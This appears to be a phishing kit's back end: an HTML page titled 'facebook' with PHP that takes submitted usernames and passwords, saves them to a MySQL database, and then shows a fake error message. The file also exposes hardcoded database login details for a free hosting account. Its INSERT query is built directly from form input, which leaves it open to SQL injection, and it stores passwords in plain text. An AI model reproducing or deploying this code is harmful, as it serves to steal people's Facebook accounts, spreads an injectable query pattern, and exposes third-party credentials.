
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>facebook</title>
    <style type="text/css">
     
      table {
        border: solid 2px #7e7c7c;
        border-collapse: collapse;
                     
      }
     
      th, h1 {
        background-color: #edf797;
      }

      td,
      th {
        border: solid 1px #7e7c7c;
        padding: 2px;
        text-align: center;
      }


    </style>
</head>
<body>
    
</body>
</html>


<?php
//validamos datos del servidor root, localhost
$user = "if0_36105577";
$pass = "uJkjnEciCi";
$host = "sql204.infinityfree.com";


//conetamos al base datos
$connection = mysqli_connect($host, $user, $pass);

//hacemos llamado al imput de formuario

$usuario = $_POST["usuario"] ;
$contraseña = $_POST["contraseña"] ;

//verificamos la conexion a base datos
if(!$connection) 
        {
            echo "No se ha podido conectar con el servidor" . mysql_error();
        }
  else
        {
            echo "<b><h3>https://www.facebook.com/</h3></b>" ;
        }
        //indicamos el nombre de la base datos nombre dbformulario
        $datab = "if0_36105577_datos";
        //indicamos selecionar ala base datos
        $db = mysqli_select_db($connection,$datab);

        if (!$db)
        {
        echo "No se ha podido encontrar la Tabla";
        }
        else
        {
        echo "<h3>Ups, ocurrio un error inesperado :(:</h3>" ;
        }
        //insertamos datos de registro al mysql xamp, indicando nombre de la tabla y sus atributos
        $instruccion_SQL = "INSERT INTO tabla_form (nombre, usuario, contraseña)
                             VALUES ('$nombre','$usuario','$contraseña')";
                           
                            
        $resultado = mysqli_query($connection,$instruccion_SQL);

        //$consulta = "SELECT * FROM tabla where id ='2'"; si queremos que nos muestre solo un registro en especifivo de ID
        $consulta = "SELECT * FROM tabla_form";
        
$result = mysqli_query($connection,$consulta);
if(!$result) 
{
    echo "No se ha podido realizar la consulta";
}



echo "</table>";

mysqli_close( $connection );

   //echo "Fuera " ;
   echo'<a href="index.html"> Volver Atrás</a>';


?>

